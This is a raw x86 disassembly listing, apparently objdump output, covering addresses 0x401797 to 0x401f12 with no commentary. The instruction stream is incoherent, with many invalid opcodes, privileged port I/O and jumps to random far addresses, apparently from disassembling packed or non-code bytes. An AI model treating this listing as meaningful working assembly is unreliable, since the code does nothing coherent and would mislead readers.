  401797:	shr    DWORD PTR [eax-0x785f0a2d],1
  40179d:	shl    DWORD PTR [edx],1
  40179f:	fimul  DWORD PTR [edi+0xa]
  4017a2:	push   ecx
  4017a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017a4:	pop    esi
  4017a5:	ja     0x40175a
  4017a7:	mov    al,0xf8
  4017a9:	jmp    0xbcb54905
  4017ae:	mov    al,0xa0
  4017b0:	out    dx,al
  4017b1:	sbb    bl,dl
  4017b3:	adc    eax,0x1e731cd1
  4017b8:	jo     0x4017a2
  4017ba:	jmp    0x4017ef
  4017bc:	inc    eax
  4017bd:	inc    eax
  4017be:	into   
  4017bf:	pop    ebp
  4017c0:	dec    esp
  4017c1:	leave  
  4017c2:	les    ecx,FWORD PTR [ecx-0x31]
  4017c5:	(bad)  
  4017c7:	mov    dl,0xde
  4017c9:	not    BYTE PTR [esi]
  4017cb:	daa    
  4017cc:	cmp    bh,dl
  4017ce:	imul   ebp,esp,0xca4de63
  4017d4:	pop    edx
  4017d5:	and    DWORD PTR [ecx],esp
  4017d7:	jns    0x401773
  4017d9:	xor    dh,BYTE PTR [edx]
  4017db:	mov    eax,ds:0xaafd8595
  4017e0:	enter  0x6011,0x81
  4017e4:	pop    esi
  4017e5:	cmp    al,0xa6
  4017e7:	in     al,0xb7
  4017e9:	dec    esp
  4017ea:	sub    al,cl
  4017ec:	shl    DWORD PTR [eax+0x6f],cl
  4017ef:	cmp    al,0x75
  4017f1:	out    dx,al
  4017f2:	cmp    BYTE PTR [ebx-0x41],al
  4017f5:	loop   0x4017de
  4017f7:	xchg   ecx,eax
  4017f8:	scas   al,BYTE PTR es:[edi]
  4017f9:	not    DWORD PTR [esp-0x2]
  4017fd:	dec    ecx
  4017fe:	(bad)  
  401800:	imul   esp,DWORD PTR [eax-0x4],0x17519232
  401807:	fwait
  401808:	pushf  
  401809:	lahf   
  40180a:	out    dx,al
  40180b:	mov    ah,0x8
  40180d:	ror    BYTE PTR [ecx],1
  40180f:	add    al,0x58
  401811:	mov    ds:0x8f45a0c2,al
  401816:	xor    cl,BYTE PTR [eax+0x37bc5757]
  40181c:	pop    esi
  40181d:	add    cl,BYTE PTR [edx-0x265a2a53]
  401823:	mov    esi,0x6e8652db
  401828:	inc    ebx
  401829:	lods   eax,DWORD PTR ds:[esi]
  40182a:	dec    esi
  40182b:	xlat   BYTE PTR ds:[ebx]
  40182c:	mov    dl,0x85
  40182e:	lods   al,BYTE PTR ds:[esi]
  40182f:	gs pop esi
  401831:	pop    esi
  401832:	mov    ss,WORD PTR [esi-0x664b0682]
  401838:	out    dx,al
  401839:	pop    edi
  40183a:	shl    BYTE PTR [ebx+0x62],0x6e
  40183e:	lahf   
  40183f:	fnop   
  401841:	nop
  401842:	push   ebp
  401843:	or     al,0x5e
  401845:	clc    
  401846:	data16 jle 0x40186b
  401849:	fnstenv [eax]
  40184b:	jecxz  0x401879
  40184d:	popa   
  40184e:	inc    edx
  40184f:	mov    al,0x2a
  401851:	scas   al,BYTE PTR es:[edi]
  401852:	rcr    eax,0x23
  401855:	xor    esi,ebp
  401857:	cmp    BYTE PTR [edi],bh
  401859:	mov    ebp,0x9a174658
  40185e:	iret   
  40185f:	lods   eax,DWORD PTR ds:[esi]
  401860:	int3   
  401861:	jae    0x4018d1
  401863:	retf   0x3807
  401866:	and    al,0x72
  401868:	dec    ebp
  401869:	inc    ebp
  40186a:	add    DWORD PTR [ecx+0x2bee1410],eax
  401870:	xor    al,0xa8
  401872:	aam    0x26
  401874:	mov    fs,WORD PTR [eax+0x6a]
  401877:	(bad)  
  401879:	pop    ebp
  40187a:	dec    eax
  40187b:	(bad)  
  40187c:	por    mm3,mm2
  40187f:	inc    ecx
  401880:	pop    ebx
  401881:	call   0x2da5c59d
  401886:	cs inc edi
  401888:	dec    edi
  401889:	repz ret 0xe1a0
  40188d:	mov    ah,0x67
  40188f:	cld    
  401890:	call   0x958a:0x5eddb3fc
  401897:	pushf  
  401898:	dec    ebp
  401899:	or     DWORD PTR [ebx-0x75],ebx
  40189c:	mov    BYTE PTR [eax+0x7],ah
  40189f:	add    al,BYTE PTR [ecx+0x310d4f41]
  4018a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018a6:	out    dx,eax
  4018a7:	rcr    BYTE PTR [edi-0x2c],1
  4018aa:	scas   eax,DWORD PTR es:[edi]
  4018ab:	rcl    BYTE PTR [ebp+0x53],0x2a
  4018af:	sbb    esi,DWORD PTR [ebx]
  4018b1:	test   eax,0x49f6a48d
  4018b6:	cmp    DWORD PTR [eax+0xb],edi
  4018b9:	push   0x76
  4018bb:	pop    ebx
  4018bc:	rcr    DWORD PTR [ebp-0x11],cl
  4018bf:	sub    DWORD PTR [edi],0xffffffa7
  4018c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018c3:	popa   
  4018c4:	lds    eax,FWORD PTR [ecx+eiz*4+0x51608a34]
  4018cb:	scas   eax,DWORD PTR es:[edi]
  4018cc:	lahf   
  4018cd:	or     dl,bh
  4018cf:	retf   0x4415
  4018d2:	out    dx,al
  4018d3:	and    al,0x6e
  4018d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018d6:	inc    eax
  4018d7:	imul   edx,DWORD PTR [ebp-0x71],0x55
  4018db:	mov    eax,ds:0x5a4971aa
  4018e0:	popf   
  4018e1:	jmp    0x40195d
  4018e3:	xor    bl,BYTE PTR [esi-0x46]
  4018e6:	sub    ecx,DWORD PTR [ebx]
  4018e8:	pusha  
  4018e9:	push   ecx
  4018ea:	pusha  
  4018eb:	sub    DWORD PTR [ebp+0x24],ecx
  4018ee:	cmp    BYTE PTR [ebp+eax*2-0x4b661159],ch
  4018f5:	sbb    eax,ecx
  4018f7:	sbb    ecx,DWORD PTR [ecx+0x53]
  4018fa:	out    dx,al
  4018fb:	fwait
  4018fc:	outs   dx,BYTE PTR ds:[esi]
  4018fd:	adc    DWORD PTR [eax+0x78],ebp
  401900:	mov    ebp,0xaea10f4c
  401905:	xchg   ebp,eax
  401906:	cmp    edx,esp
  401908:	mov    ebx,ebx
  40190a:	(bad)  ds:0xea098d37
  401910:	pop    esi
  401911:	dec    edi
  401912:	jmp    0x85d5:0x42e0eb66
  401919:	pop    ecx
  40191a:	and    al,0x6
  40191c:	ror    BYTE PTR [ecx-0x20363e62],cl
  401922:	not    DWORD PTR [edx+0x5e]
  401925:	gs dec ebx
  401927:	inc    ebx
  401928:	inc    ecx
  401929:	pop    eax
  40192a:	aam    0x85
  40192c:	sbb    eax,0x75d72661
  401931:	inc    edi
  401932:	jle    0x40197c
  401934:	mov    dl,0xa2
  401936:	out    dx,al
  401937:	push   eax
  401938:	js     0x4018e4
  40193a:	daa    
  40193b:	pop    es
  40193c:	and    BYTE PTR [ecx-0x6c6c6008],0x9c
  401943:	pushf  
  401944:	push   ds
  401945:	jle    0x4018f8
  401947:	add    DWORD PTR [ebp+0x38],eax
  40194a:	out    dx,al
  40194b:	push   0x1a
  40194d:	pop    ds
  40194e:	mov    eax,0xcbf95506
  401953:	mov    al,ds:0xac3d531b
  401958:	fisttp WORD PTR ds:0xbe5e1820
  40195e:	pop    bx
  401960:	call   0x6361:0x66ac57e
  401967:	or     esi,eax
  401969:	dec    eax
  40196a:	icebp  
  40196b:	ja     0x4019dd
  40196d:	loop   0x40195d
  40196f:	ret    
  401970:	pop    edx
  401971:	pop    edi
  401972:	add    bh,al
  401974:	push   cs
  401975:	adc    al,0x22
  401977:	xchg   DWORD PTR [esi+0x5d],ebp
  40197a:	(bad)
  40197d:	lahf   
  40197e:	sti    
  40197f:	mov    dh,0x96
  401981:	dec    ecx
  401982:	mov    al,0x9a
  401984:	xor    esi,DWORD PTR ds:0x495a20f9
  40198a:	jmp    0x95afc2a2
  40198f:	mov    eax,ds:0xdcf2269a
  401994:	or     BYTE PTR ds:0x15dc89d,0x57
  40199b:	std    
  40199c:	push   ecx
  40199d:	call   0xa12a:0x2ea25bcd
  4019a4:	jb     0x4019c9
  4019a6:	jo     0x401a1b
  4019a8:	addr16 adc eax,0xbd5fdf19
  4019ae:	stos   DWORD PTR es:[edi],eax
  4019af:	and    al,0x6f
  4019b1:	dec    esp
  4019b2:	es sbb dh,cl
  4019b5:	iret   
  4019b6:	and    eax,0xb810eb10
  4019bb:	daa    
  4019bc:	and    eax,0xeceb0029
  4019c1:	pop    edi
  4019c2:	mov    esp,0x31d38f4e
  4019c7:	imul   edx,esp,0x3707fa88
  4019cd:	hlt    
  4019ce:	xor    eax,0xaf973ba1
  4019d3:	inc    esi
  4019d4:	xor    DWORD PTR ss:[edi+0x43e63ea0],esp
  4019db:	xor    BYTE PTR [ecx+0x1d],0xfc
  4019df:	dec    ebp
  4019e0:	pop    esi
  4019e1:	int    0xf2
  4019e3:	enter  0x6349,0xd6
  4019e7:	das    
  4019e8:	repz pusha 
  4019ea:	fdivr  QWORD PTR [eax]
  4019ec:	inc    esi
  4019ed:	or     cl,BYTE PTR [edi+ebp*8]
  4019f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019f1:	xchg   ecx,eax
  4019f2:	add    cl,BYTE PTR [edi-0xb8f8624]
  4019f8:	jmp    0xf685b1d
  4019fd:	adc    eax,0x23eba0fa
  401a02:	mov    cl,0xcb
  401a04:	cmp    DWORD PTR [edx+0x3f],ebp
  401a07:	adc    bl,BYTE PTR [ebx+0x63]
  401a0a:	sub    BYTE PTR ds:0x5dfe1bfe,cl
  401a10:	mov    bl,0xf1
  401a12:	sahf   
  401a13:	lea    edx,[esi-0x66]
  401a16:	inc    edi
  401a17:	popa   
  401a18:	adc    edi,DWORD PTR ds:0x1d64efe3
  401a1e:	out    dx,al
  401a1f:	bound  edi,QWORD PTR [ecx+0x5a]
  401a22:	rol    ch,0x96
  401a25:	rcr    DWORD PTR [edi-0x5e],0xee
  401a29:	push   es
  401a2a:	jge    0x401a9e
  401a2c:	mov    edi,0x2c4cf20b
  401a31:	add    edi,ebp
  401a33:	xor    edx,DWORD PTR [edx]
  401a35:	jae    0x401a28
  401a37:	gs dec edi
  401a39:	mov    dh,0x93
  401a3b:	mov    eax,ds:0xbfb00ca5
  401a40:	data16 sbb bh,cl
  401a43:	push   esi
  401a44:	ss scas eax,DWORD PTR es:[edi]
  401a46:	pop    ebp
  401a47:	mov    al,ds:0xc16a0f9c
  401a4c:	lahf   
  401a4d:	rol    DWORD PTR [ecx],1
  401a4f:	bound  edi,QWORD PTR [ecx]
  401a51:	popa   
  401a52:	rcr    DWORD PTR [ebp+0x16],1
  401a55:	xchg   edi,eax
  401a56:	pop    esp
  401a57:	sub    bl,0x7f
  401a5a:	out    dx,al
  401a5b:	mov    esp,0xa0737e46
  401a60:	imul   edi,DWORD PTR [edx+ebx*2+0x6a60cf7f],0x5ecbfd5d
  401a6b:	mov    ebp,ds
  401a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a6e:	out    dx,al
  401a6f:	mov    esi,0x1ce0d7a1
  401a74:	outs   dx,DWORD PTR ds:[esi]
  401a75:	push   ss
  401a76:	popf   
  401a77:	mov    eax,ds:0xd08cbc8c
  401a7c:	sub    esi,DWORD PTR [esi+0x675e7b05]
  401a82:	adc    DWORD PTR [esi+0x23],0xf930a3fa
  401a89:	push   edx
  401a8a:	repnz cmc 
  401a8c:	rol    BYTE PTR [esi+0x3975188d],cl
  401a92:	daa    
  401a93:	pop    ebp
  401a94:	gs icebp 
  401a96:	and    cl,ah
  401a98:	mov    eax,0x3a5495d9
  401a9d:	sbb    dh,0xbb
  401aa0:	nop    DWORD PTR [edi-0x5e]
  401aa4:	push   ecx
  401aa5:	int3   
  401aa6:	inc    edx
  401aa7:	(bad)  [esi]
  401aa9:	xor    eax,0xf86a80aa
  401aae:	push   es
  401aaf:	pop    edi
  401ab0:	sbb    DWORD PTR [edx],edx
  401ab2:	cs ins DWORD PTR es:[edi],dx
  401ab4:	xor    BYTE PTR [esi],ch
  401ab6:	xlat   BYTE PTR ds:[ebx]
  401ab7:	les    eax,FWORD PTR [edx+ecx*4]
  401aba:	xor    DWORD PTR [ecx+0x7bffd3a3],esp
  401ac0:	pop    eax
  401ac1:	xchg   esi,eax
  401ac2:	(bad)  [ecx]
  401ac4:	pop    esi
  401ac5:	jb     0x401b12
  401ac7:	mov    dl,0x52
  401ac9:	les    ecx,FWORD PTR [edi+0x7761601d]
  401acf:	mov    edi,0x9c74c5a
  401ad4:	pop    edi
  401ad5:	ins    BYTE PTR es:[edi],dx
  401ad6:	in     eax,dx
  401ad7:	jg     0x401a85
  401ad9:	adc    eax,0x7508311c
  401ade:	ds cs xchg esp,eax
  401ae1:	pusha  
  401ae2:	aas    
  401ae3:	and    ebx,DWORD PTR [edi]
  401ae5:	or     al,BYTE PTR [edx+eax*1+0x76]
  401ae9:	pop    esp
  401aea:	out    dx,al
  401aeb:	inc    edi
  401aec:	leave  
  401aed:	pop    ds
  401aee:	dec    edi
  401aef:	inc    ecx
  401af0:	imul   ecx,DWORD PTR ds:0x2b2ba164,0xa44a6a56
  401afa:	and    al,0x1f
  401afc:	cs retf 0x92ec
  401b00:	mov    ds:0xbea15c97,al
  401b05:	retf   
  401b06:	adc    BYTE PTR [edi-0x40],al
  401b09:	into   
  401b0a:	les    edi,FWORD PTR [edx]
  401b0c:	push   ebx
  401b0d:	cdq    
  401b0e:	sbb    eax,0x72465eaa
  401b13:	cmp    dl,BYTE PTR [eax]
  401b15:	fidiv  WORD PTR [ebp-0x369f0110]
  401b1b:	and    eax,0x3664bace
  401b20:	mov    eax,DWORD PTR [esi+eiz*1+0x6663f786]
  401b27:	in     eax,dx
  401b28:	pop    edi
  401b29:	fstp   QWORD PTR [esp+ecx*4+0x219d765f]
  401b30:	test   eax,0x2ea0bcf9
  401b35:	cmp    esp,DWORD PTR [eax+0x21]
  401b38:	and    dl,BYTE PTR [ecx-0xc]
  401b3b:	dec    ebx
  401b3c:	pop    esi
  401b3d:	fld    TBYTE PTR [ecx]
  401b3f:	jo     0x401ad7
  401b41:	leave  
  401b42:	ss rcl al,0x60
  401b46:	sbb    al,0x90
  401b48:	dec    esp
  401b49:	dec    edx
  401b4a:	or     eax,0xee1af45f
  401b4f:	cmp    BYTE PTR [ebx],ah
  401b51:	inc    ecx
  401b52:	push   ss
  401b53:	iret   
  401b54:	cmp    al,0xef
  401b56:	js     0x401af9
  401b58:	lds    eax,FWORD PTR [ebx-0x4e]
  401b5b:	test   DWORD PTR [ecx+edx*4-0x68a1a5bd],0x1e21b025
  401b66:	pop    eax
  401b67:	jne    0x401be2
  401b69:	mov    ah,0x6d
  401b6b:	mov    eax,ds:0x27f7a95a
  401b70:	sub    al,0xd4
  401b72:	push   esp
  401b73:	and    BYTE PTR [esi],0xdd
  401b76:	aaa    
  401b77:	test   al,0x94
  401b79:	xor    BYTE PTR [ebp+0x4e672b47],ah
  401b7f:	and    DWORD PTR ds:0xa2a3c7b0,ebp
  401b85:	sar    BYTE PTR [esi],cl
  401b87:	rcr    BYTE PTR [edi-0x71f1a4b1],0xd3
  401b8e:	sub    edi,eax
  401b90:	pop    edi
  401b91:	test   BYTE PTR [ebx+0x10],0x3
  401b95:	and    eax,0x69ce6fac
  401b9a:	add    ch,BYTE PTR [edi-0x603e9f73]
  401ba0:	sub    al,0x29
  401ba2:	mov    ch,0x49
  401ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ba5:	aad    0xee
  401ba7:	dec    ax
  401ba9:	fiadd  WORD PTR [ecx+0x9]
  401bac:	sub    BYTE PTR [edi-0x32],ah
  401baf:	mov    al,ds:0xa8013be6
  401bb4:	jp     0x401bb5
  401bb6:	jp     0x401bb4
  401bb8:	pop    ebp
  401bb9:	inc    ebx
  401bba:	mov    ebp,0x929894ae
  401bbf:	hlt    
  401bc0:	inc    BYTE PTR [esi-0x37]
  401bc3:	mov    al,ds:0x62a17a3a
  401bc8:	ja     0x401c08
  401bca:	inc    ebp
  401bcb:	mov    esi,0x2761975e
  401bd0:	invd   
  401bd2:	jns    0x401be7
  401bd4:	xor    al,0x4f
  401bd6:	dec    edi
  401bd7:	lods   eax,DWORD PTR ds:[esi]
  401bd8:	dec    ebx
  401bd9:	popa   
  401bda:	nop
  401bdb:	add    eax,0x53d00611
  401be0:	pop    esi
  401be1:	jo     0x401b79
  401be3:	jg     0x401c64
  401be5:	mov    WORD PTR [ecx-0x25],cs
  401be8:	mov    dl,0x60
  401bea:	xchg   ebx,eax
  401beb:	and    al,0x5a
  401bed:	xchg   esp,eax
  401bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bef:	add    al,0x74
  401bf1:	dec    esi
  401bf2:	out    dx,al
  401bf3:	int3   
  401bf4:	mov    ebx,0x478af70
  401bf9:	cld    
  401bfa:	nop
  401bfb:	mov    al,ds:0x7c8b350e
  401c00:	popf   
  401c01:	jmp    0x80bf0810
  401c06:	shl    DWORD PTR [edi],1
  401c08:	pop    edi
  401c09:	cmp    al,0xd8
  401c0b:	in     eax,0x27
  401c0d:	in     al,dx
  401c0e:	les    ebx,FWORD PTR [eax]
  401c10:	adc    al,0xcd
  401c12:	sub    DWORD PTR [ecx-0x7d5a895],esp
  401c18:	pop    esp
  401c19:	mov    eax,0x463ed96
  401c1e:	and    ebx,DWORD PTR [edi]
  401c20:	dec    eax
  401c21:	and    eax,esi
  401c23:	popa   
  401c24:	inc    eax
  401c25:	jge    0x401c4e
  401c27:	lahf   
  401c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c29:	cmp    eax,0xb09e19d4
  401c2e:	clc    
  401c2f:	mov    ds:0x4aea0c3d,eax
  401c34:	dec    ebx
  401c35:	push   DWORD PTR [esp+ebx*1+0xd3b53de]
  401c3c:	repz pusha 
  401c3e:	sub    DWORD PTR [edx-0x4a8c3f2c],edx
  401c44:	pop    ecx
  401c45:	push   esi
  401c46:	jmp    0x9e1a:0x36cad3f3
  401c4d:	clc    
  401c4e:	(bad)  
  401c4f:	xor    al,0x38
  401c51:	popa   
  401c52:	inc    eax
  401c53:	leave  
  401c54:	push   esi
  401c55:	les    ecx,FWORD PTR [ecx]
  401c57:	adc    ebx,DWORD PTR [ebp+0x5e]
  401c5a:	out    dx,al
  401c5b:	add    al,0xd6
  401c5d:	push   esi
  401c5e:	cld    
  401c5f:	mov    al,0x37
  401c61:	sbb    al,BYTE PTR [ebx-0x5f]
  401c64:	sbb    DWORD PTR [ecx],esi
  401c66:	daa    
  401c67:	fldcw  WORD PTR [edi]
  401c69:	rol    BYTE PTR [esi],1
  401c6b:	aaa    
  401c6c:	es inc ebp
  401c6e:	push   esp
  401c6f:	mov    eax,ds:0x3131de79
  401c74:	dec    esi
  401c75:	clc    
  401c76:	inc    eax
  401c77:	test   al,0x46
  401c79:	test   al,0xc4
  401c7b:	in     eax,0xa4
  401c7d:	push   edx
  401c7e:	cs pop eax
  401c80:	mov    BYTE PTR [edi-0x7f],bh
  401c83:	dec    esp
  401c84:	pop    esi
  401c85:	jl     0x401c74
  401c87:	shl    BYTE PTR [eax+0x2d],1
  401c8a:	jge    0x401c12
  401c8c:	js     0x401cee
  401c8e:	stc    
  401c8f:	ss jnp 0x401cf4
  401c92:	ins    BYTE PTR es:[edi],dx
  401c93:	and    bh,BYTE PTR [edi]
  401c95:	jmp    0x1062:0xd35eb3e0
  401c9c:	pop    ebx
  401c9d:	ds ss inc edi
  401ca0:	add    al,0x61
  401ca2:	sub    al,0x69
  401ca4:	(bad)  
  401ca5:	xchg   edx,eax
  401ca6:	sbb    al,0x44
  401ca8:	push   esp
  401ca9:	pop    esp
  401caa:	in     al,0x44
  401cac:	pop    esi
  401cad:	fmul   st,st(5)
  401caf:	in     al,0x3d
  401cb1:	retf   
  401cb2:	fdivr  QWORD PTR [esi-0x26588a9c]
  401cb8:	popa   
  401cb9:	inc    esp
  401cba:	xchg   ecx,eax
  401cbb:	and    DWORD PTR ds:0xa007d6d4,esi
  401cc1:	dec    esi
  401cc2:	out    dx,al
  401cc3:	fs cdq 
  401cc5:	jne    0x401cdf
  401cc7:	or     eax,DWORD PTR [esp+ecx*8]
  401cca:	outs   dx,DWORD PTR ds:[esi]
  401ccb:	rep outs dx,BYTE PTR ds:[esi]
  401ccd:	pusha  
  401cce:	sbb    DWORD PTR [edx-0x56a0d9a7],0x8
  401cd5:	clc    
  401cd6:	out    dx,al
  401cd7:	lods   al,BYTE PTR ds:[esi]
  401cd8:	xor    DWORD PTR [ebp-0x36],edi
  401cdb:	sbb    dh,BYTE PTR [eax+0x72]
  401cde:	iret   
  401cdf:	test   al,0xca
  401ce1:	aas    
  401ce2:	out    dx,al
  401ce3:	mov    esp,DWORD PTR [ecx+0x3]
  401ce6:	mov    gs,WORD PTR ss:[ecx]
  401ce9:	xor    dh,ch
  401ceb:	lods   al,BYTE PTR ds:[esi]
  401cec:	xor    BYTE PTR [esi-0x52c4637],ch
  401cf2:	js     0x401ce5
  401cf4:	pop    ebx
  401cf5:	popa   
  401cf6:	push   ebp
  401cf7:	ret    0x8ee7
  401cfa:	xlat   BYTE PTR ds:[ebx]
  401cfb:	xchg   edx,eax
  401cfc:	xlat   BYTE PTR ds:[ebx]
  401cfd:	xchg   edi,esp
  401cff:	pop    ebp
  401d00:	mov    cl,0xcc
  401d02:	(bad)  
  401d03:	mov    ds:0x21c70f3e,eax
  401d08:	dec    eax
  401d09:	popa   
  401d0a:	dec    eax
  401d0b:	add    DWORD PTR [eax-0x3130de1e],eax
  401d11:	push   esi
  401d12:	xlat   BYTE PTR ds:[ebx]
  401d13:	mov    bl,0x53
  401d15:	sbb    al,ch
  401d17:	stos   DWORD PTR es:[edi],eax
  401d18:	popf   
  401d19:	lods   eax,DWORD PTR ds:[esi]
  401d1a:	idiv   DWORD PTR [esi]
  401d1c:	mov    bh,0xb2
  401d1e:	push   cs
  401d1f:	mov    ah,0xa
  401d21:	pop    edi
  401d22:	xchg   edi,eax
  401d23:	out    0xc,eax
  401d25:	mov    eax,ebx
  401d27:	mov    ebx,0xea7d87fe
  401d2c:	pop    esi
  401d2d:	dec    edx
  401d2e:	mov    dh,0xea
  401d30:	aas    
  401d31:	jae    0x401d82
  401d33:	enter  0x60aa,0xaf
  401d37:	dec    eax
  401d38:	stc    
  401d39:	or     BYTE PTR [edx],cl
  401d3b:	mov    cl,0x90
  401d3d:	(bad)  
  401d3e:	pusha  
  401d3f:	xor    ebx,DWORD PTR [ebp-0x63]
  401d42:	shl    DWORD PTR [eax+ecx*1+0x27],0x35
  401d47:	add    ebx,DWORD PTR [esi-0x525e5cea]
  401d4d:	push   esi
  401d4e:	push   edi
  401d4f:	xchg   DWORD PTR [bx+0x6],ecx
  401d53:	push   edx
  401d54:	pop    esi
  401d55:	push   ebp
  401d56:	test   al,0x4f
  401d58:	dec    eax
  401d59:	data16 add BYTE PTR [ebp+0x719e60cf],0x7f
  401d61:	fbld   TBYTE PTR [edi-0x6b]
  401d64:	lods   eax,DWORD PTR ds:[esi]
  401d65:	jno    0x401d55
  401d67:	fwait
  401d68:	nop
  401d69:	loopne 0x401d0e
  401d6b:	dec    esi
  401d6c:	and    edx,DWORD PTR [edx-0x20]
  401d6f:	mov    al,ds:0x3388a6dc
  401d74:	and    dh,BYTE PTR [eax+0x5fc332]
  401d7a:	imul   esi,DWORD PTR [eax+0x315f3c1c],0x36
  401d81:	jmp    0x401d4d
  401d83:	mov    al,ds:0xf631a750
  401d88:	pop    esp
  401d89:	jge    0x401d7e
  401d8b:	out    dx,al
  401d8c:	mov    dh,0xc5
  401d8e:	out    dx,al
  401d8f:	xor    al,0xcb
  401d91:	ds dec esp
  401d93:	or     ebp,eax
  401d95:	dec    ebp
  401d96:	fsub   QWORD PTR [eax+0x14ac69d0]
  401d9c:	fst    DWORD PTR [edi]
  401d9e:	mov    al,0x75
  401da0:	pop    esi
  401da1:	push   0xcb0fb903
  401da6:	adc    esp,ecx
  401da8:	mov    eax,DWORD PTR [edi+esi*8-0x62]
  401dac:	or     esp,ecx
  401dae:	scas   eax,DWORD PTR es:[edi]
  401daf:	xchg   ebx,eax
  401db0:	pop    ss
  401db1:	xor    DWORD PTR [ecx-0x6d],ecx
  401db4:	pop    esi
  401db5:	nop
  401db6:	dec    esp
  401db7:	mov    ds:0xc2342a6,eax
  401dbc:	push   ebx
  401dbd:	push   edx
  401dbe:	add    bh,BYTE PTR [ebx]
  401dc0:	call   0x4e53:0xe3ed1561
  401dc7:	xchg   esi,eax
  401dc8:	cmp    dl,BYTE PTR [ebx+0x41]
  401dcb:	loop   0x401e2b
  401dcd:	mov    ebp,0x4248da2f
  401dd2:	gs dec esp
  401dd4:	gs push esi
  401dd6:	jb     0x401e0d
  401dd8:	fisubr DWORD PTR [edi+0x211373ee]
  401dde:	fistp  WORD PTR [eax]
  401de0:	mov    dh,0xfd
  401de2:	out    dx,al
  401de3:	jg     0x401d65
  401de5:	pop    edx
  401de6:	sub    al,0xdf
  401de8:	sub    ch,BYTE PTR [edx+0x1cb9a846]
  401dee:	pop    ds
  401def:	xor    eax,0xc6caa06c
  401df4:	jb     0x401dc4
  401df6:	or     BYTE PTR [eax+esi*4],dh
  401df9:	xor    eax,esi
  401dfb:	add    eax,0x5a654090
  401e00:	push   eax
  401e01:	xor    ch,BYTE PTR [ebx]
  401e03:	mov    al,ds:0x35e47085
  401e08:	mov    esi,0x91546fb5
  401e0d:	sub    ch,dh
  401e0f:	int3   
  401e10:	repnz outs dx,BYTE PTR ds:[esi]
  401e12:	jo     0x401e1c
  401e14:	adc    al,0x29
  401e16:	inc    esi
  401e17:	mov    eax,ds:0xde42089f
  401e1c:	je     0x401e79
  401e1e:	lahf   
  401e1f:	in     eax,0x5e
  401e21:	(bad)  
  401e23:	hlt    
  401e24:	stos   BYTE PTR es:[edi],al
  401e25:	iret   
  401e26:	int    0x64
  401e28:	fwait
  401e29:	fs cmp dl,ch
  401e2c:	fist   DWORD PTR [ebp-0x6c]
  401e2f:	(bad)  
  401e30:	mov    al,0xa0
  401e32:	xchg   ebx,eax
  401e33:	mov    esp,ebx
  401e35:	cmp    al,0xef
  401e37:	and    DWORD PTR [ecx-0x68],ebp
  401e3a:	pop    edx
  401e3b:	and    DWORD PTR [esi],ebx
  401e3d:	inc    ebp
  401e3e:	dec    eax
  401e3f:	js     0x401de4
  401e41:	rol    DWORD PTR gs:[edx+0x737e625e],cl
  401e48:	inc    esi
  401e49:	pop    ecx
  401e4a:	and    cl,bl
  401e4c:	imul   ecx,DWORD PTR [di+0x11b3],0xc7f9f361
  401e55:	mov    gs,WORD PTR [esi-0x7d03660]
  401e5b:	mov    al,cl
  401e5d:	outs   dx,DWORD PTR ds:[esi]
  401e5e:	popa   
  401e5f:	add    ebx,DWORD PTR [esi+0x7e]
  401e62:	sahf   
  401e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e64:	jae    0x401e8d
  401e66:	repnz sbb eax,0x960360b3
  401e6c:	(bad)  
  401e6d:	icebp  
  401e6e:	ins    BYTE PTR es:[edi],dx
  401e6f:	add    eax,0x20eef73a
  401e74:	push   eax
  401e75:	outs   dx,BYTE PTR ds:[esi]
  401e76:	mov    al,ds:0xbc971dc
  401e7b:	mov    eax,ds:0x56f22dd7
  401e80:	nop
  401e81:	pop    ebp
  401e82:	not    dl
  401e84:	push   esp
  401e85:	dec    eax
  401e86:	aaa    
  401e87:	pop    edi
  401e88:	(bad)  
  401e8a:	mov    dl,BYTE PTR [ecx]
  401e8c:	mov    bh,0x75
  401e8e:	and    al,0xa0
  401e90:	int3   
  401e91:	pop    esp
  401e92:	pop    edx
  401e93:	push   ss
  401e94:	mov    edi,0xd65d69a1
  401e99:	dec    esi
  401e9a:	fwait
  401e9b:	les    ebx,FWORD PTR [esi+0x33]
  401e9e:	inc    edx
  401e9f:	and    ebp,DWORD PTR [ebx+edi*4]
  401ea2:	jge    0x401e8c
  401ea4:	add    eax,0x192cdb61
  401ea9:	pop    edi
  401eaa:	retf   
  401eab:	gs xchg esp,eax
  401ead:	outs   dx,DWORD PTR ds:[esi]
  401eae:	out    dx,al
  401eaf:	xchg   ebx,eax
  401eb0:	loop   0x401ef3
  401eb2:	sar    DWORD PTR [eax+0x70],0x81
  401eb6:	ficomp WORD PTR [ecx+edi*4-0x776eae96]
  401ebd:	shr    dh,0x85
  401ec0:	dec    ebp
  401ec1:	into   
  401ec2:	lods   al,BYTE PTR ds:[esi]
  401ec3:	and    eax,0xaac951f7
  401ec8:	into   
  401ec9:	cli    
  401eca:	out    dx,al
  401ecb:	cmp    esp,esi
  401ecd:	shl    DWORD PTR [eax-0x11991b97],cl
  401ed3:	cmp    eax,0x63ba093b
  401ed8:	test   BYTE PTR [esi+0x7783a10c],0xdb
  401edf:	sub    eax,DWORD PTR [ecx+edx*8]
  401ee2:	sub    DWORD PTR [ebp+0x5865505c],ebp
  401ee8:	pop    ebx
  401ee9:	pop    DWORD PTR [ecx+eiz*4]
  401eec:	jb     0x401f57
  401eee:	pop    ecx
  401eef:	pop    ss
  401ef0:	xchg   ebp,eax
  401ef1:	hlt    
  401ef2:	xlat   BYTE PTR ds:[ebx]
  401ef3:	das    
  401ef4:	pop    esi
  401ef5:	(bad)  
  401ef6:	mov    ecx,0x70a5978f
  401efb:	(bad)  [edx+0x61]
  401efe:	lods   al,BYTE PTR ds:[esi]
  401eff:	sub    DWORD PTR [ecx],eax
  401f01:	icebp  
  401f02:	(bad)
  401f05:	add    ch,ah
  401f07:	sub    edi,DWORD PTR [esi-0x42]
  401f0a:	jne    0x401ecf
  401f0c:	push   ecx
  401f0d:	rcl    dl,0x42
  401f10:	jne    0x401eaa
  401f12:	push   esi
